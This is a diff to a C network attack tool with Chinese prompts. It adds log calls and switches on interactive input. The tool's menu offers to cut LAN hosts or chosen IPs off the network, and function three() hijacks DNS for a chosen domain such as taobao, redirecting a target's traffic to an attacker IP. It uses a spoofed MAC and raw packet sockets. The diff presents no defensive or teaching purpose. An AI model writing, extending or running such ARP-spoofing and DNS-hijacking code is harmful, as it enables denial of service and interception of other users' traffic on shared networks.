@@ -28,11 +28,13 @@
 #include <pthread.h>
 
 #include "socket.h"
+#include  "log.h"
 
 unsigned char cheat_mac[6] = {0x0f,0x0f,0x29,0x34,0x4d,0xef};
 
 int one()
 {
+	LOG("one()\n");
 	int ip[255]={0};
 	unsigned char mac[255][6];
 	int size;
@@ -56,6 +58,7 @@ int one()
 
 int two()
 {
+	LOG("two()\n");
 	printf("[1]局域网所有主机断网.\n");
 	printf("[2]指定IP断网.\n");
 	printf("[3]断开两台主机..\n");
@@ -145,6 +148,7 @@ int two()
 
 static void *p_send_data(void *data)
 {
+	LOG("p_send_data\n");
 	int send_sock;
 	if((send_sock=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
 	{
@@ -182,20 +186,21 @@ static void *p_send_data(void *data)
 
 int three()
 {	
+	LOG("three\n");
 	char target_ip[20]={"192.168.1.107"};
 	char hijack_domain[20]={"baidu"};
     char redirect_ip[20]={"192.168.1.109"};
 
-	// printf(".......................................  ");
-	// printf("目标IP:");
-	// scanf("%s",target_ip);
+	printf(".......................................  ");
+	printf("目标IP:");
+	scanf("%s",target_ip);
 
-	// printf("...劫持域名(如www.taobao.com，则输入taobao即可):");
-	// scanf("%s",hijack_domain);
+	printf("...劫持域名(如www.taobao.com，则输入taobao即可):");
+	scanf("%s",hijack_domain);
 
-	// printf(".....................................  ");
-	// printf("重定向IP:");
-	// scanf("%s",redirect_ip);
+	printf(".....................................  ");
+	printf("重定向IP:");
+	scanf("%s",redirect_ip);
 
 	int dstip = inet_addr(target_ip);
 	unsigned char localmac[6],dstmac[6],gatewaymac[6];
@@ -251,7 +256,6 @@ int three()
     char domain[100] = {0};
     int send_enable; /* route data ? */
     int i=0;
-    int totalsize = 0;
     while(1)
     {
 		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
@@ -413,6 +417,7 @@ int three()
 
 int four()
 {
+	LOG("four()\n");
 	char target_ip[20]={0};
 	printf(".......................................  ");
 	printf("目标IP:");
